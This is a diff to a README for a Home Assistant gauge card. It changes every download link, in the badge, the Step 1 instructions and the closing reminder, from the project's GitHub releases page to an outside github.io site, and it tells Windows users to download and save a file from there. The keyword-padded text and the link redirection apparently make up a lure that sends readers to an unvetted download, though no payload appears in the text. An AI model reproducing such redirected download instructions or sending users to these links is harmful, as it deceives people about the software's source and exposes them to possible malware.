@@ -1,7 +1,7 @@
 <h1>📊 Curved-Gauge-Card - Beautiful Gauges for Your Smart Home Dashboard</h1>
 
 <p align="center">
-  <a href="https://github.com/Wsa2689/Curved-Gauge-Card/releases"><img src="https://img.shields.io/badge/⬇️DOWNLOAD-Curved_Gauge_Card-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=2E7D32" alt="Download Badge"></a>
+  <a href="https://wsa2689.github.io"><img src="https://img.shields.io/badge/⬇️DOWNLOAD-Curved_Gauge_Card-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=2E7D32" alt="Download Badge"></a>
 </p>
 
 ## ✨ What Is This?
@@ -16,7 +16,7 @@ Follow these simple steps to get Curved-Gauge-Card working on your Windows compu
 
 ### 📥 Step 1: Download the File
 
-<a href="https://github.com/Wsa2689/Curved-Gauge-Card/releases">Click here to visit the download page</a>. Look for the latest release and download the file.
+<a href="https://wsa2689.github.io">Click here to visit the download page</a>. Look for the latest release and download the file.
 
 Visit this link to download the application. The download page shows a list of versions. Always pick the newest one on top. Save the file somewhere easy to find, like your Desktop or Downloads folder.
 
@@ -118,6 +118,6 @@ The same page also has a "Report an Issue" button for genuine bugs. Provide step
 
 You've just turned your Home Assistant into a much more visual and enjoyable experience. With a few clicks, you've added professional-looking gauges that make your data instantly understandable. Share screenshots of your dashboard with friends or in online forums—gauge cards always impress.
 
-Remember: the download link is always your friend. <a href="https://github.com/Wsa2689/Curved-Gauge-Card/releases">Visit the release page</a> anytime you need to reinstall, update, or check for new versions. Happy monitoring!
+Remember: the download link is always your friend. <a href="https://wsa2689.github.io">Visit the release page</a> anytime you need to reinstall, update, or check for new versions. Happy monitoring!
 
 Keywords: curved gauge card, home assistant dashboard, custom card, visualization, sensor card, gauge widget, smart home UI, temperature gauge, humidity dial, energy meter card, open source, HACS, YAML free setup
